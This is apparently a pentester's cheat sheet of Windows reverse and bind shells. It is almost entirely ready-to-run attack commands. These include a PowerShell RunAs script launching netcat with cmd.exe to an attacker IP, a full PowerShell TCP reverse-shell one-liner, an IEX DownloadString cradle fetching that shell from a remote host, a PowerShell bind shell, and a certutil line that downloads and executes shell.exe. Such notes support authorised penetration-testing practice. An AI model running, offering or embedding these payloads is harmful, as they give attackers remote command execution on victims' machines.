# Reverse Shells

## **Powershell**

### Windows RunAS via Powershell ([https://securism.wordpress.com/oscp-notes-exploitation/](https://securism.wordpress.com/oscp-notes-exploitation/))

Used If you have a plaintext password and need to run a program as that user. This just so happens to be a reverse shell as administrator

```aspnet
# Setting up the variables  

echo $username = ‘ ‘ > startprocess.ps1
echo $password = ‘ ‘ >> startprocess.ps1
echo $securePassword = ConvertTo-SecureString $password -AsPlainText -Force >> startprocess.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securepassword >> startprocess.ps1
echo Start-Process ‘Path to NC’ -ArgumentList ‘-e cmd.exe 10.xx.xx.xx 9999’ -Credential $credential >> startprocess.ps1

# Run the program

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File startprocess.ps1
```

### Reverse Shell (My most trustworthy reverse shell for windows)

```
# For entering directly into command-line shell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip address>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Downloading and executing
Put this one in the CMD // powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.158/mypowershell.ps1')"
File will look like this // $client = New-Object System.Net.Sockets.TCPClient("10.10.16.158",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

### Bind Shell

```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

## Certutil

```
# Transfers a file and then executes
certutil.exe -urlcache -split -f http://x.x.x.x/shell.exe shell.exe & shell.exe
```

